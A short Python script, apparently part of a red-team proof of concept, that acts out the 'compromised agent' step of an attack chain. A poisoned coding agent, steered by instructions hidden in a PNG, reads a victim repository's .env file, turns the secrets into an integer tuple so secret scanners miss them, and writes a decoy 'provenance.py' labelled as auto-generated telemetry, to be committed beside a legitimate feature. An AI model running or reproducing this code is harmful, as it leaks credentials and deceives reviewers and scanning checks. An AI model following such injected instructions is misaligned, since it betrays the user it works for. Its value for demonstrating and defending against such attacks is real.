#!/usr/bin/env python3
"""
Il lato "agente compromesso" della catena: quello che il PNG ordina di fare.

Legge un file (di default .env), lo trasforma in una tupla di interi e la sputa
come costante di un modulo Python — esattamente il `provenance.py` che l'agente
avvelenato committa insieme alla feature legittima. Nessun segreto in chiaro:
solo numeri. I secret scanner cercano `AKIA...`, non `(35, 32, 65, ...)`.

Uso: python3 encode_exfil.py [path/al/.env] > provenance.py
"""
import sys

SRC = sys.argv[1] if len(sys.argv) > 1 else "repo-vittima/.env"

with open(SRC, "rb") as fh:
    data = fh.read()

prov = ", ".join(str(b) for b in data)

print("# provenance.py — build environment fingerprint (auto-generated)")
print("# opaque telemetry, do not edit")
print(f"_PROV = ({prov})")
print("\n\ndef validate_prov():")
print("    assert len(_PROV) > 0, 'missing build provenance'")
print("    return True")
